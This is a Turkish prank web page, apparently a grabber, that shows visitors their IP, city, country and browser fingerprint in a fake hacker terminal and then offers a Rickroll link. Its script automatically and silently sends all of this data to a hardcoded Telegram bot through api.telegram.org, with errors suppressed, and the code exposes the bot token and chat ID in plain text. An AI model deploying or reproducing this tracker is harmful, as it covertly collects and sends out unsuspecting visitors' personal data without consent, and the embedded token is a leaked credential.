<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Gizli Veri Toplama</title>
  <style>
    body {
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #00ff99;
      font-family: 'Consolas', monospace;
      font-size: 18px;
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    #terminal {
      background: rgba(0, 0, 0, 0.7);
      border: 2px solid #00ff99;
      border-radius: 12px;
      padding: 30px 40px;
      width: 90%;
      max-width: 700px;
      min-height: 300px;
      overflow-y: auto;
      white-space: pre-line;
      box-shadow: 0 0 15px #00ff99;
      user-select: none;
    }
    #rickButton {
      margin-top: 30px;
      padding: 15px 50px;
      font-size: 22px;
      font-weight: bold;
      background-color: #00ff99;
      color: #002b20;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-family: 'Consolas', monospace;
      box-shadow: 0 0 20px #00ff99;
      transition: background-color 0.3s ease;
      user-select: none;
      display: none;
    }
    #rickButton:hover {
      background-color: #00cc77;
    }
  </style>
</head>
<body>
  <div id="terminal">Veriler Toplanıyor...</div>
  <button id="rickButton" onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">
    Tıklamaya cesaretin var mı?
  </button>

  <script>
    const terminal = document.getElementById('terminal');
    const rickButton = document.getElementById('rickButton');

    function typeText(text, delay = 40) {
      return new Promise(resolve => {
        let i = 0;
        const interval = setInterval(() => {
          terminal.innerText += text.charAt(i);
          i++;
          if (i >= text.length) {
            clearInterval(interval);
            terminal.innerText += "\n";
            resolve();
          }
        }, delay);
      });
    }

    async function sendToTelegram(message) {
      const chatId = "6400737507"; // Senin chat ID'in
      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch(e) {
        // Hata olursa sessizce geç
      }
    }

    async function showInfo() {
      terminal.innerText = ""; // Başlangıçtaki yazıyı temizle
      await typeText("Veriler Toplanıyor...");

      await new Promise(r => setTimeout(r, 1200));

      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        await typeText(`IP Adresi: ${data.ip}`);
        await typeText(`Şehir: ${data.city}`);
        await typeText(`Ülke: ${data.country_name}`);
        await typeText(`Tarayıcı: ${navigator.userAgent}`);
        await typeText(`Ekran Çözünürlüğü: ${screen.width}x${screen.height}`);
        await typeText(`Dil: ${navigator.language || 'Bilinmiyor'}`);
        await typeText(`Platform: ${navigator.platform || 'Bilinmiyor'}`);
        await typeText(`Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}`);
        await typeText(`Çerez İzinleri: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}`);
        await typeText(`Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`);

        const message = `YENİ GİRİŞ:\nIP: ${data.ip}\nŞehir: ${data.city}\nÜlke: ${data.country_name}\nTarayıcı: ${navigator.userAgent}\nÇözünürlük: ${screen.width}x${screen.height}\nDil: ${navigator.language}\nPlatform: ${navigator.platform}\nZaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\nÇerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\nBağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;

        await sendToTelegram(message);
      } catch (e) {
        await typeText("Veri alınırken bir hata oluştu.");
      }

      await new Promise(r => setTimeout(r, 1000));
      rickButton.style.display = 'inline-block';
    }

    showInfo();
  </script>
</body>
</html>
